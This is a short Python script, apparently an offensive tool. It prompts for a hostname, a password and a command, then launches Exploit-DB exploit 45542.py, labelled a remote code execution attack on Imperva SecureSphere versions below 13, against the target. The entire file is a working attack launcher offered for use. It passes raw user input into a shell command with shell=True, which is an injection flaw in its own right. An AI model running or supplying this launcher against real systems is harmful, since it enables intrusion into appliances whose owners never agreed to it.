import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'


def exploit():
    target = input(f"{Colors.red}(Imperva SecureSphere <13 RCE){Colors.end} [Enter Hostname or Ip Address]:~#")
    password = input(f"{Colors.red}(Imperva SecureSphere <13 RCE){Colors.end} [Enter Password]:~#")
    command = input(f"{Colors.red}(Imperva SecureSphere <13 RCE){Colors.end} [Enter Command To Be Executed]:~#")
    sub.call(f"python /usr/share/exploitdb/exploits/linux/webapps/45542.py -t {target} -p {password} {command}", shell=True)


if __name__ == "__main__":
    exploit()
